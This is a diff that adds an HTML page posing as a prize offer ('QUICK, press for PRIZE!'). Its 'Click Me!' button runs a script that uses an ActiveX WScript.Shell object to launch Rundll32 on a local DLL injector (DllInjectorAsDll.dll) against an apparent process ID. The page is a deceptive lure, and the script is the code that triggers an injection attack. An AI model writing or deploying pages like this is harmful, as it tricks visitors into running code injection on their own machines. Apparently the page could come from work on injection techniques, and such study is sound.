@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<script>
+function LaunchApp() {
+    var ws = new ActiveXObject("WScript.Shell");
+    ws.Exec("Rundll32.exe C:\\Temp\\DllInjectorAsDll.dll HelperFunc 68928");
+}
+</script>
+
+<h1>QUICK, press for PRIZE!</h1>
+
+<button type="button" onclick="LaunchApp()">Click Me!</button>
+ 
+</body>
+</html>
